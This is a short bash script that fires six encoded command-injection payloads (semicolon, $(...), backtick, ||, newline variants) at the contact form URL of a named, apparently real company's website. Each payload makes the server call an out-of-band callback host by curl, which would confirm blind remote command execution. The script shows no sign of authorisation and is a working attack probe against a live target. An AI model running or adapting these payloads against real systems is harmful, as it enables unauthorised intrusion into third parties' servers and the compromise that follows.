#!/bin/bash
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36'
H=oob22ee87696843.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
for pl in ";curl+http://$H/c1" "%24%28curl+http://$H/c2" "%60curl+http://$H/c3%60" "||curl+http://$H/c4" "1%0acurl+http://$H/c5" "1%3bcurl+http://$H/c6"; do
  code=$(curl -s --http1.1 -m 20 -o /dev/null -w "%{http_code}" "https://www.infinitycapital.bh/contact?x=$pl" -A "$UA")
  echo "payload=$pl -> $code"
done
